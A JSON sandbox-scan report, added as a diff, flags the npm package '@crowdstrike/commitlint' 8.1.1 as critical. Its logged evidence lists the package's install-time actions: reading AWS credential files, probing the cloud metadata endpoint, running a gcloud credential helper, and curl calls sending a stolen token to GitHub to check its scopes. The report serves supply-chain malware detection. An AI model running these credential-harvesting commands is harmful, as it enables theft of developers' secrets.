@@ -1,0 +1,194 @@
+{
+ "scan_id": "rh-20261106-085439-9917a1",
+ "package": "@crowdstrike/commitlint",
+ "version": "8.1.1",
+ "integrity": "sha512-uuuJbYbZbXxtGaLKjdqY7/TZVk1I2gToC5so8cf8iVMYYBJVtjLCmvDl6liLUDfYQF/gPT2MPfNZUiupXtNJ7w==",
+ "verdict": "CRITICAL",
+ "reasons": [
+  "CRITICAL: honeytoken aws_access_key_id left the sandbox",
+  "CRITICAL: stolen token used against fake GitHub",
+  "CRITICAL: stolen token used against fake npm",
+  "HIGH: read bait (/home/dev/.aws/credentials) and attempted network access",
+  "HIGH: spawned curl",
+  "HIGH: spawned curl"
+ ],
+ "container_aware": false,
+ "seconds": 11.86,
+ "evidence": {
+  "exfil_matches": [
+   "aws_access_key_id"
+  ],
+  "machine_leaks": [],
+  "token_uses": [
+   "GitHub",
+   "npm"
+  ],
+  "bait_reads": [
+   "/home/dev/.aws/credentials"
+  ],
+  "connects": [
+   "169.254.169.254",
+   "api.github.com",
+   "registry.npmjs.org",
+   "sts.us-east-1.amazonaws.com"
+  ],
+  "execs": [
+   [
+    [
+     "npm",
+     "rebuild",
+     "--foreground-scripts",
+     "--ignore-scripts=false"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "/usr/local/bin/npm",
+     "rebuild",
+     "--foreground-scripts",
+     "--ignore-scripts=false"
+    ],
+    false
+   ],
+   [
+    [
+     "sh",
+     "-c",
+     "node bundle.js"
+    ],
+    true
+   ],
+   [
+    [
+     "node",
+     "bundle.js"
+    ],
+    true
+   ],
+   [
+    [
+     "/tmp/processor.sh",
+     "<honeytoken>"
+    ],
+    false
+   ],
+   [
+    [
+     "cat"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-s",
+     "-I",
+     "-H",
+     "Authorization: token <honeytoken>",
+     "https://api.github.com/user"
+    ],
+    false
+   ],
+   [
+    [
+     "grep",
+     "-i",
+     "x-oauth-scopes:"
+    ],
+    false
+   ],
+   [
+    [
+     "cut",
+     "-d ",
+     "-f2-"
+    ],
+    false
+   ],
+   [
+    [
+     "/bin/sh",
+     "-c",
+     "gcloud config config-helper --format json"
+    ],
+    false
+   ],
+   [
+    [
+     "tr",
+     "-d",
+     "\\r"
+    ],
+    false
+   ],
+   [
+    [
+     "curl",
+     "-s",
+     "-X",
+     "GET",
+     "-H",
+     "Accept: application/vnd.github.v3+json",
+     "-H",
+     "Authorization: token <honeytoken>",
+     "https://api.github.com/user"
+    ],
+    false
+   ],
+   [
+    [
+     "node",
+     "/work/.rh/load.js",
+     "@crowdstrike/commitlint"
+    ],
+    false
+   ],
+   [
+    [
+     "/usr/local/bin/node",
+     "/work/.rh/exercise.js",
+     "@crowdstrike/commitlint"
+    ],
+    false
+   ],
+   [
+    [
+     "git",
+     "rev-parse",
+     "--abbrev-ref",
+     "HEAD"
+    ],
+    false
+   ],
+   [
+    [
+     "/usr/local/bin/node",
+     "/work/node_modules/@crowdstrike/commitlint/bin/index.js",
+     "--help"
+    ],
+    false
+   ]
+  ],
+  "writes": [
+   "/work/node_modules/.bin/commitlint"
+  ],
+  "incomplete": [],
+  "deadline_killed": false,
+  "load_hang": false,
+  "probe_flags": [],
+  "stats_count": 3965
+ },
+ "sandbox": {
+  "deadline_killed": false,
+  "exit_code": 0,
+  "errors": [],
+  "seconds": 7.85,
+  "syscall_lines": 37855,
+  "unparsed": 0,
+  "sinkhole_records": 41,
+  "dependencies": "9 dependencies fetched"
+ },
+ "microvm": null
+}
